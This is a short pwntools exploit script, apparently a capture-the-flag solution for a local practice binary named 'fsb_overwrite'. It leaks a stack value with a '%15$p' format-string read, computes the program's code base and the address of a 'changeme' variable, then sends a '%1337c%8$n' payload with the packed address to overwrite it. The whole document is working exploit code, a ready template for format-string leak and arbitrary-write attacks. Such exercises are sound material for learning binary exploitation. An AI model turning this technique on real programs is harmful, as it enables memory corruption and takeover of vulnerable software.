from pwn import *

def slog(n, m) : return success(': '.join([n, hex(m)]))

p = process('./fsb_overwrite')
elf = ELF('./fsb_overwrite')

# [1] Get Address of changeme
p.sendline(b'%15$p') # FSB
leaked = int(p.recvline()[:-1], 16)
code_base = leaked - 0x1293
changeme = code_base + elf.symbols['changeme']

slog('code_base', code_base)
slog('changeme', changeme)

# [2] Overwrite changeme
payload = b'%1337c'
payload += b'%8$n'
payload += b'A' * 6
payload = payload + p64(changeme)

p.sendline(payload)

p.interactive()